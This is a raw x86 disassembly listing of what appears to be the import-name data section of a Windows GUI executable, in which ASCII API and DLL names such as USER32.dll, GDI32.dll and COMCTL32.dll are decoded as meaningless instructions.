  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
